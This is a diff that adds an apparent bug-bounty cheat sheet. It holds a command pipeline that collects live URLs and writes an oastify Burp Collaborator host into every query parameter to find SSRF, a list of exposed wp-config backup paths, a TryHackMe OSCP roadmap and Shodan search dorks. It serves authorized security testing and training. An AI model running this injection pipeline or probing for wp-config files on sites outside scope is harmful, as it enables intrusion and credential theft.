@@ -1,0 +1,159 @@
+Step 1: Subdomain Enumeration
+
+•DNS Dumpster
+•Sublist3r
+•Amass
+•Google Dorking
+•Certificate Transparency Logs
+•subdomainer
+
+Step 2: Find Live Domains
+
+cat all-domains.txt | httpx > all-live.txt
+
+Step 3: Identify All URLs
+
+cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
+
+Step 4: Injection Burp Collaborator URL in Parameters
+
+cat /home/casperino/tools/nuclei/httpx.txt | grep "=" | ./qsreplace 40ga7gynfy6pcg06ov.oastify.com > ssrf.txt
+
+Step 5: Test for SSRF Vulnerabilities
+
+cat ssrf.txt | httpx -fr
+
+Step 6: How to check which URL is vulnerable
+
+split -l 10 ssrf.txt output_file_
+
+
+🚨Here is a list of WP-exposed (wp-config sensitive) files!🚨
+
+/wp-config.php-backup /wp-config.php.orig
+/.wp-config.php.swp
+/wp-config-sample.php /wp-config.inc /wp-config.old /wp-config.txt
+/wp-config.php.txt
+/wp-config.php.bak
+/wp-config.php.old
+/wp-config.php.dist
+/wp-config.php.inc
+/wp-config.php.swp
+/wp-config.php.html
+/wp-config-backup.txt
+/wp-config.php.save
+/wp-config.php~
+/wp-config.php.original
+/_wpeprivate/config.json
+
+
+TRYHACKME ROADMAP FOR OSCP 🔥 
+🚨 SHARE MAYBE SOMEONE NEED IT 🚨
+# Level 1 - Intro  
+- [ ] OpenVPN 
+lnkd.in/dpxHjrtN
+  
+- [ ] Welcome 
+lnkd.in/d3t_AC4N
+  
+- [ ] Intro to Researching lnkd.in/dxRR2mCV  
+- [ ] Learn Linux lnkd.in/ds9aJqhA  
+- [ ] Crash Course Pentesting lnkd.in/dCT8Vvvp  
+  
+Introductory CTFs to get your feet wet  
+  
+- [ ] Google Dorking lnkd.in/dBnRpSyq  
+- [ ] OHsint lnkd.in/dDhikJkB  
+- [ ] Shodan.io lnkd.in/dy9a4t-C  
+  
+# Level 2 - Tooling  
+- [ ] Tmux lnkd.in/djqaA_Wc  
+- [ ] Nmap lnkd.in/dHfVFjeK  
+- [ ] Web Scanning lnkd.in/dkp8dKnn  
+- [ ] Sublist3r lnkd.in/d69wJm4H  
+- [ ] Metasploit lnkd.in/dsy3sY9s  
+- [ ] Hydra lnkd.in/dg4hZA-h  
+- [ ] Linux Privesc lnkd.in/drKTQiSj  
+- [ ] Web Scanning lnkd.in/dkp8dKnn  
+  
+More introductory CTFs  
+- [ ] Vulnversity - lnkd.in/d5b-bqPz  
+- [ ] Blue - lnkd.in/dpa5R5wf  
+- [ ] Simple CTF lnkd.in/d2dxPVX4  
+- [ ] Bounty Hacker lnkd.in/dWdnv3Hz  
+  
+# Level 3 - Crypto & Hashes with CTF practice  
+- [ ] Crack the hash lnkd.in/danFHdPZ  
+- [ ] Agent Sudo lnkd.in/dEXNdG6z  
+- [ ] The Cod Caper lnkd.in/dBUvrZ-g  
+- [ ] Ice lnkd.in/dW5tUzv6  
+- [ ] Lazy Admin lnkd.in/dVAJkf5p  
+- [ ] Basic Pentesting lnkd.in/dVNq_JCa  
+  
+# Level 4 - Web  
+- [ ] OWASP top 10 lnkd.in/dQx2Hbr2  
+- [ ] Inclusion lnkd.in/dmTFjN-r  
+- [ ] Injection lnkd.in/dt7x7KHs  
+- [ ] Vulnversity lnkd.in/d5b-bqPz  
+- [ ] Basic Pentesting lnkd.in/dVNq_JCa  
+- [ ] Juiceshop lnkd.in/dkUjtqYi  
+- [ ] Ignite lnkd.in/dkRY4UDk  
+- [ ] Overpass lnkd.in/dgGT72mQ  
+- [ ] Year of the Rabbit lnkd.in/dgAGTRtV  
+- [ ] DevelPy lnkd.in/dKpBkHMy  
+- [ ] Jack of all trades lnkd.in/dJbxj73D  
+- [ ] Bolt lnkd.in/dMCYzbfm
+
+
+
+
+
+Some Shodan Dorks that might useful in Bug Bounty. 
+ 
+1. org:"http://target.com" 
+2. http.status:"<status_code>" 
+3. product:"<Product_Name>" 
+4. port:<Port_Number> “Service_Message” 
+5. port:<Port_Number> “Service_Name” 
+6. http.component:"<Component_Name>" 
+7. http.component_category:"<Component_Category> 
+8. http.waf:"<firewall_name>" 
+9. http.html:"<Name>" 
+10. http.title:"<Title_Name>" 
+11. ssl.alpn:"<Protocol>" 
+12. http.favicon.hash:"<Favicon_Hash>" 
+13. net:"<Net_Range>" (for e.g. 104.16.100.52/32) 
+14. http://ssl.cert.subject.cn:"<http://Domain.com>" 
+15. asn:"<ASnumber>" 
+16. hostname:"<hosthame>" 
+17. ip:"<IP_Address>" 
+18. all:"<Keyword>" 
+19. “Set-Cookie: phpMyAdmin” 
+20. “Set-Cookie: lang=" 
+21. “Set-Cookie: PHPSESSID" 
+22. “Set-Cookie: webvpn” 
+23. “Set-Cookie:webvpnlogin=1" 
+24. “Set-Cookie:webvpnLang=en” 
+25. “Set-Cookie: mongo-express=" 
+26. “Set-Cookie: user_id=" 
+27. “Set-Cookie: phpMyAdmin=" 
+28. “Set-Cookie: _gitlab_session” 
+29. “X-elastic-product: Elasticsearch” 
+30. “x-drupal-cache” 
+31. “access-control-allow-origin” 
+32. “WWW-Authenticate”  
+33. “X-Magento-Cache-Debug”   
+34. “kbn-name: kibana”
+
+
+
+
+
+
+
+
+
+
+
+
+
